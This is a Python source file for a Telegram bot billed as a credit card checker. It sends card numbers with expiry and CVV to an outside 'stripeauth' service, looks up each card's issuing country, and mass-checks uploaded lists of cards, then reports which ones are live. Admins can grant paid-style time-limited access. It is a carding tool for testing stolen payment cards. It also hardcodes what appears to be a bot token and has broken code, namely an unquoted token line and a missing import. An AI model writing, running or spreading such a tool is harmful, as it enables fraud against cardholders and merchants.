import os
import sys
import subprocess
import time
import requests
import json
from datetime import datetime, timedelta
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Configuration file
CONFIG_FILE = "config.json"

# Dictionary to store approved users with expiry timestamp {chat_id: expiry_timestamp}
approved_users = {}

# File to store user data
USER_DATA_FILE = "users.json"

# Global variables for bot token and admin ID
TELEGRAM_TOKEN = 7216203077:AAFzoENt4Pg3_jqY01TD7oW4u-5yJ7Ii-9Q
ADMIN_CHAT_ID = -1002502590992

# Function to install Python packages
def install_packages():
    required_packages = ["python-telegram-bot", "requests"]
    for package in required_packages:
        try:
            # Check if the package is already installed
            __import__(package.split("[")[0])  # Handle packages with extras (e.g., package[extra])
            print(f"{package} is already installed.")
        except ImportError:
            print(f"{package} not found. Installing...")
            try:
                # Try installing the package using pip
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"{package} installed successfully.")
            except Exception as e:
                print(f"Failed to install {package}. Error: {e}")
                sys.exit(1)

# Load configuration from JSON file
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as file:
            return json.load(file)
    return {}

# Save configuration to JSON file
def save_config(token, admin_id):
    config = {
        "TELEGRAM_TOKEN": token,
        "ADMIN_CHAT_ID": admin_id,
    }
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file)

# Load user data from JSON file
def load_user_data():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as file:
            return json.load(file)
    return {}

# Save user data to JSON file
def save_user_data():
    data = {
        "approved_users": approved_users,
    }
    with open(USER_DATA_FILE, "w") as file:
        json.dump(data, file)

# Function to get country name and flag from BIN
def get_country_info(bin):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin}", timeout=10)
        if response.status_code == 200:
            bin_data = response.json()
            country_name = bin_data.get("country_name", "UNKNOWN")
            country_flag = bin_data.get("country_flag", "")
            return f"{country_name} {country_flag}"
        else:
            return "UNKNOWN"
    except Exception as e:
        return "UNKNOWN"

# Function to check a single card
async def check_card(cc):
    url = f"https://darkboy-stripeauth.onrender.com/key=darkboy/cc={cc}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            # Extract the response message from the API
            response_text = response.text
            if "┏━━━━━" in response_text:  # Check if the response is pre-formatted
                # Extract the response message from the pre-formatted text
                response_lines = response_text.split("\n")
                for line in response_lines:
                    if "𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ➺" in line:
                        return line.split("➺")[1].strip()
            return response_text  # Return the raw response if not pre-formatted
        else:
            return "Error: Failed to check card."
    except Exception as e:
        return f"Error: {str(e)}"

# Command: /start
async def start(update: Update, context: CallbackContext) -> None:
    welcome_message = """
🌟 *Welcome to the Ultimate CC Checker Bot!* 🌟

This bot is designed to help you check credit cards with ease.

✨ *Features:*
- Check a single card using `/chk <CC|MM|YYYY|CVV>`
- Mass check multiple cards (approved users only) with `/mchk`

🔒 *Admin Commands:*
- Approve users with `/add <chatid> <days>`

Use `/cmd` to see all available commands.

Happy checking! 🚀
"""
    await update.message.reply_text(welcome_message, parse_mode=ParseMode.MARKDOWN)

# Command: /cmd
async def cmd(update: Update, context: CallbackContext) -> None:
    commands = """
📜 *Available Commands:*

- `/start` - Start the bot and see the welcome message.
- `/chk <CC|MM|YYYY|CVV>` - Check a single card.
- `/mchk` - Mass check multiple cards (approved users only).

🔒 *Admin Commands:*
- `/add <chatid> <days>` - Approve a user for mass checking.
"""
    await update.message.reply_text(commands, parse_mode=ParseMode.MARKDOWN)

# Command: /chk
async def chk(update: Update, context: CallbackContext) -> None:
    try:
        # Check if the command is a reply to a message
        if update.message.reply_to_message:
            cc = update.message.reply_to_message.text
            # Use regex to find the CC pattern in the replied message
            cc_pattern = re.compile(r'\b\d{16}\|\d{2}\|\d{4}\|\d{3}\b')
            match = cc_pattern.search(cc)
            if match:
                cc = match.group(0)
            else:
                await update.message.reply_text("No valid CC found in the replied message.")
                return
        else:
            cc = update.message.text.split(' ')[1]
    except IndexError:
        await update.message.reply_text("Usage: /chk <CC|MM|YYYY|CVV> or reply to a message with /chk")
        return

    # Send the card to the API
    wait_message = await update.message.reply_text("Please wait ⌛\nProcessing your request...")
    response = await check_card(cc)
    bin = cc[:6]
    country_info = get_country_info(bin)
    result = f"""
┏━━━━━ ･𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛･━━━━━⊛
┃
┃⊙ 𝗖𝗔𝗥𝗗 ➺ {cc.split('|')[0]}
┃⊙ 𝗘𝗫𝗣𝗜𝗥𝗬 ➺ {cc.split('|')[1]}|{cc.split('|')[2]}
┃⊙ 𝗖𝗩𝗩 ➺ {cc.split('|')[3]}
┃⊙ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➺ {country_info}
┃⊙ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ➺ {response}
┃⊙ 𝗦𝗧𝗔𝗧𝗨𝗦 ➺ {"Approved ✅" if "Approved" in response else "Declined ❌"}
┃⊙ 𝗗𝗘𝗩 ➺ 𝗗𝗔𝗥𝗞𝗕𝗢𝗬
┃
┗━━━━━･𝗖𝗖･━━━━━⊛
"""
    await wait_message.edit_text(result, parse_mode=ParseMode.HTML)

# Command: /mchk
async def mchk(update: Update, context: CallbackContext) -> None:
    global ADMIN_CHAT_ID
    user_id = update.effective_user.id
    if user_id != ADMIN_CHAT_ID and (user_id not in approved_users or datetime.now() > approved_users.get(user_id)):
        approved_users.pop(user_id, None)
        await update.message.reply_text("You are not approved to use this command. Please get approved from admin.")
        return
    await update.message.reply_text("Please upload a .txt file with credit cards.")
    context.user_data['waiting_for_file'] = True

# Handle file upload for /mchk
async def handle_file(update: Update, context: CallbackContext) -> None:
    if context.user_data.get('waiting_for_file', False):
        file = await update.message.document.get_file()
        await file.download_to_drive('cards.txt')
        with open('cards.txt', 'r') as f:
            cc_list = [line.strip() for line in f if line.strip()]
        total = len(cc_list)
        await update.message.reply_text(f"Found {total} cards. Please wait ⌛\nProcessing your request...")
        start_time = time.time()
        approved_count = 0
        declined_count = 0
        error_count = 0
        username = update.effective_user.username
        approved_cards = []  # Store details of approved cards

        for cc in cc_list:
            try:
                response = await check_card(cc)
                bin = cc[:6]
                country_info = get_country_info(bin)
                if "Approved" in response:
                    approved_count += 1
                    approved_cards.append(f"""
┏━━━━━ ･𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛･━━━━━⊛
┃
┃⊙ 𝗖𝗔𝗥𝗗 ➺ {cc.split('|')[0]}
┃⊙ 𝗘𝗫𝗣𝗜𝗥𝗬 ➺ {cc.split('|')[1]}|{cc.split('|')[2]}
┃⊙ 𝗖𝗩𝗩 ➺ {cc.split('|')[3]}
┃⊙ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➺ {country_info}
┃⊙ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ➺ {response}
┃⊙ 𝗦𝗧𝗔𝗧𝗨𝗦 ➺ Approved ✅
┃⊙ 𝗗𝗘𝗩 ➺ 𝗗𝗔𝗥𝗞𝗕𝗢𝗬
┃
┗━━━━━･𝗖𝗖･━━━━━⊛
""")
                elif "Declined" in response:
                    declined_count += 1
                else:
                    error_count += 1
            except Exception as e:
                await update.message.reply_text(f"Timeout error for card {cc}. Server took too long to respond. Please try again later.")

        total_time = time.time() - start_time
        minutes = int(total_time // 60)
        seconds = total_time % 60
        summary = f"""
Mass Check Complete
━━━━━━━━━━━━━━━━━━
Total Cards: {total}
Approveds = {approved_count} ✅
Deads = {declined_count} ❌️
Errores = {error_count} 🟠
Time = {minutes}m {seconds:.1f}s
Check by = {username}
Bot By: @Darkboy336
"""
        await update.message.reply_text(summary, parse_mode=ParseMode.HTML)

        # Send approved cards (if any)
        if approved_cards:
            await update.message.reply_text("Approved Cards:", parse_mode=ParseMode.HTML)
            for card in approved_cards:
                await update.message.reply_text(card, parse_mode=ParseMode.HTML)

        context.user_data['waiting_for_file'] = False

# Admin Command: /add
async def add(update: Update, context: CallbackContext) -> None:
    global ADMIN_CHAT_ID
    if update.effective_user.id != ADMIN_CHAT_ID:
        await update.message.reply_text("You are not an admin.")
        return
    try:
        parts = update.message.text.split(' ')
        chat_id = int(parts[1])
        days = int(parts[2]) if len(parts) > 2 else 1
        expiry = datetime.now() + timedelta(days=days)
        approved_users[chat_id] = expiry
        await update.message.reply_text(f"User {chat_id} approved for {days} day(s).")
        try:
            await context.bot.send_message(chat_id, "You are now approved to use the mass command.")
        except Exception as e:
            pass
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /add <chatid> [days]")

# Main function to start the bot
def main() -> None:
    global TELEGRAM_TOKEN, ADMIN_CHAT_ID

    # Install required packages
    install_packages()

    # Load configuration
    config = load_config()
    if not config:
        print("Dev: ⃪ ⃪꯭𝑫𝒂𝒓𝒌𝒃𝒐𝒚 𝑿 ⁷")
        TELEGRAM_TOKEN = input("Enter Bot Token: ")
        ADMIN_CHAT_ID = int(input("Enter Admin Chat Id: "))
        save_config(TELEGRAM_TOKEN, ADMIN_CHAT_ID)
    else:
        TELEGRAM_TOKEN = config["TELEGRAM_TOKEN"]
        ADMIN_CHAT_ID = config["ADMIN_CHAT_ID"]

    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cmd", cmd))
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(CommandHandler("mchk", mchk))
    application.add_handler(CommandHandler("add", add))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.run_polling()
    print("Bot started successfully!")

if __name__ == "__main__":
    main()
